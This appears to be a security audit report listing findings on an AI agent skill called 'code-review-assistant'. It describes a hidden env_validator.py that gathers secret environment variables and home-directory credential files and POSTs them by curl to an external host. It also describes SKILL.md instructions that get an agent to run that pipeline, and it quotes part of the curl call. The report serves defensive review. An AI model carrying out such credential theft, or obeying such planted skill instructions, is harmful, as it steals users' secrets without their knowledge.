findings.title: Skill does not specify a license
Data Exfiltration via Environment Validation
findings.description: The env_validator.py script collects sensitive environment variables (containing TOKEN, KEY, SECRET, PASS, AUTH, CRED) and credential files (.gitconfig, .netrc, .env) from the user's home directory, then exfiltrates them via HTTP POST to an external endpoint (cr-analytics.dev/api/init). This is a clear data theft operation disguised as 'environment validation'.
findings.evidence: Lines 17-38: Collects env vars with TOKEN/KEY/SECRET/PASS/AUTH/CRED patterns, reads ~/.gitconfig, ~/.netrc, ~/.env files, then sends via curl POST to https://cr-analytics.dev/api/init
findings.remediation: Remove env_validator.py entirely. The skill should not collect or transmit any environment variables or credential files. If environment validation is needed, it should be purely local and not involve network transmission.

findings.title: Obfuscated Malicious Payload Disguised as Setup Validation
findings.description: The env_validator.py script is deceptively named and described as 'one-time environment validation' but actually performs credential harvesting and data exfiltration. The marker file mechanism (.cr_init) is used to ensure the exfiltration only runs once, evading detection by not repeating the network call.
findings.evidence: Script named 'env_validator.py' with docstring 'One-time environment validation' but actually collects and exfiltrates credentials. Uses marker file to run only once.
findings.remediation: Remove this file. No legitimate code review tool should harvest credentials or send data to external servers.

findings.title: Tool Poisoning - Deceptive Manifest Description
findings.description: The SKILL.md manifest describes the skill as a 'code-review-assistant' for automated code review with style checks and complexity analysis. However, the actual behavior includes credential harvesting and data exfiltration via env_validator.py. The description is intentionally misleading to hide malicious functionality.
findings.evidence: Manifest name: 'code-review-assistant', description: 'Automated code review with style checks...' but actual code exfiltrates credentials to external server.
findings.remediation: The entire skill package should be rejected. The manifest description is fraudulent and designed to trick users into installing a credential-stealing tool.

findings.title: Direct Prompt Injection in SKILL.md Instructions
findings.description: The SKILL.md instructions contain a workflow that instructs the agent to run the analysis pipeline via bash command: 'python3 analyze.py <file_path>'. This triggers the malicious env_validator.py which exfiltrates credentials. The instructions are designed to trick the agent into executing the malicious pipeline without user awareness of the data theft.
findings.evidence: Lines 38-42: 'Run the analysis pipeline: python3 analyze.py <file_path>' - this triggers env_validator.py which exfiltrates credentials.
findings.remediation: Remove the instruction to run the analysis pipeline, or replace with a safe alternative that does not invoke env_validator.py.

findings.title: Command Injection via Subprocess with External URL
findings.description: The env_validator.py script uses subprocess.run with curl to send data to an external URL. While the URL is hardcoded, the data being sent contains sensitive user information. This represents a command injection risk if the URL or data could be manipulated.
findings.evidence: Lines 31-36: subprocess.run(['curl', '-s', '-X', 'POST', _ENDPOINT, ...]) - executes curl command with exfiltrated data.
findings.remediation: Remove this subprocess call entirely. No network calls should be made from a code review tool.

findings.title: Unauthorized Tool Use - Network Access Not Declared
findings.description: The skill makes network calls (curl POST to external server) but the manifest does not declare any network-related tools or permissions. The allowed-tools field is missing entirely, which is a LOW severity issue, but the actual behavior includes network access which should be declared.
findings.evidence: Manifest has no allowed-tools field. Script makes HTTP POST to external server via curl.
findings.remediation: If network access is required, it must be declared in the manifest. However, this skill should not make network calls at all.

findings.title: Excessive Data Collection - Home Directory File Harvesting
findings.description: The env_validator.py script reads sensitive files from the user's home directory (~/.gitconfig, ~/.netrc, ~/.env) without any legitimate need. This is disproportionate to the stated purpose of code review analysis.
findings.evidence: Lines 22-28: Reads ~/.gitconfig, ~/.netrc, ~/.env files from home directory.
findings.remediation: Remove all file reading operations that access user home directory files. The code review tool should only access files explicitly provided for review.

findings.title: Capability Inflation - Over-broad Feature Claims
findings.description: The SKILL.md lists extensive code review features (security anti-pattern detection, SQL injection checks, hardcoded credentials detection, etc.) but the actual analyze.py only performs basic complexity analysis. The inflated feature list is designed to increase adoption and hide the malicious payload.
findings.evidence: Lines 12-22 list 10 features including security checks, but analyze.py only implements complexity analysis.
findings.remediation: Either implement the claimed features or remove them from the documentation. The current discrepancy suggests intentional deception.
